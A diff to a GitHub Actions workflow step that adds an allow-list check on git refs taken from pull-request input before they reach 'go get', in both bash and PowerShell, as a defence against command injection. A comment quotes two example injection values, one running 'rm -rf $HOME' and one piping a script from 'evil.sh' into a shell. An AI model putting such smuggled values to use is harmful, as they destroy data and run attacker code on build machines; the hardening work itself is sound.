@@ -119,13 +119,27 @@ runs:
         # circuits. Failures in (1) and (2) are swallowed — the
         # authoritative fetch is (3), which propagates any real error.
         FETCHED=0
+        # safe_ref_re — accept only the character set legal for git
+        # branch names and Go pseudo-versions. The ref is derived from
+        # untrusted input (PR body, branch name), and although `go get`
+        # itself rejects shell metacharacters in the URL fragment the
+        # surrounding bash command still treats `${ref}` as a string
+        # to be interpolated; a value like "main$(rm -rf $HOME)" or
+        # "main; curl evil.sh|sh" would expand under the workflow's
+        # default IFS handling. Reject anything outside the allow-list
+        # before we let the value reach `go get`.
+        safe_ref_re='^[A-Za-z0-9._/-]+$'
         try_fetch() {
           local ref="$1"
           local source="$2"
           [ -z "$ref" ] && return 1
           [ "$ref" = "$INTEGRATION_REF" ] && return 1  # skip duplicate fetch
+          if ! [[ "$ref" =~ $safe_ref_re ]]; then
+            echo "  ✗ rejecting ref \"$ref\" (from $source): contains characters outside [A-Za-z0-9._/-]"
+            return 1
+          fi
           echo "Trying integrations@${ref} (from ${source})"
-          if GOPRIVATE=github.com/keploy/integrations go get github.com/keploy/integrations@${ref} 2>/dev/null; then
+          if GOPRIVATE=github.com/keploy/integrations go get "github.com/keploy/integrations@${ref}" 2>/dev/null; then
             echo "✓ Fetched integrations@${ref}"
             FETCHED=1
             return 0
@@ -151,9 +165,18 @@ runs:
         fi
 
         # Step 3: authoritative fall-through. Propagates errors.
+        # INTEGRATION_REF originates from `vars.INTEGRATION_REF` (a
+        # workflow-level config value) rather than untrusted PR input,
+        # but apply the same allow-list as the dynamic refs above so a
+        # mis-set repo variable can't drive arbitrary command
+        # execution either.
         if [ "$FETCHED" != "1" ]; then
+          if ! [[ "$INTEGRATION_REF" =~ $safe_ref_re ]]; then
+            echo "::error::INTEGRATION_REF \"$INTEGRATION_REF\" contains characters outside [A-Za-z0-9._/-]; refusing to fetch"
+            exit 1
+          fi
           echo "Fetching private integrations dependency via SSH (INTEGRATION_REF=${INTEGRATION_REF})..."
-          GOPRIVATE=github.com/keploy/integrations go get github.com/keploy/integrations@${INTEGRATION_REF}
+          GOPRIVATE=github.com/keploy/integrations go get "github.com/keploy/integrations@${INTEGRATION_REF}"
         fi
 
         echo "Creating extraparsers.go (platform-independent)..."
@@ -188,10 +211,19 @@ runs:
 
         $env:GOPRIVATE = "github.com/keploy/integrations"
         $Fetched = $false
+        # Same allow-list as the bash step: refuse refs containing
+        # anything outside the git-branch / Go-pseudo-version legal
+        # set so a malicious PR body can't smuggle pwsh metacharacters
+        # into the `go get` invocation.
+        $SafeRefRe = '^[A-Za-z0-9._/-]+$'
 
         function Try-Fetch([string]$Ref, [string]$Source) {
           if ([string]::IsNullOrWhiteSpace($Ref)) { return $false }
           if ($Ref -eq $env:INTEGRATION_REF) { return $false }
+          if ($Ref -notmatch $SafeRefRe) {
+            Write-Host "  rejecting ref '$Ref' (from $Source): contains characters outside [A-Za-z0-9._/-]"
+            return $false
+          }
           Write-Host "Trying integrations@$Ref (from $Source)"
           go get "github.com/keploy/integrations@$Ref" 2>$null
           if ($LASTEXITCODE -eq 0) {
@@ -220,6 +252,10 @@ runs:
         if (-not $Fetched) { $Fetched = Try-Fetch $env:GITHUB_HEAD_REF_VAL "github.head_ref" }
 
         if (-not $Fetched) {
+          if ($env:INTEGRATION_REF -notmatch $SafeRefRe) {
+            Write-Host "::error::INTEGRATION_REF '$env:INTEGRATION_REF' contains characters outside [A-Za-z0-9._/-]; refusing to fetch"
+            exit 1
+          }
           Write-Host "Fetching private integrations dependency via SSH (INTEGRATION_REF=$env:INTEGRATION_REF)..."
           go get "github.com/keploy/integrations@$env:INTEGRATION_REF"
           if ($LASTEXITCODE -ne 0) { throw "go get failed for $env:INTEGRATION_REF" }
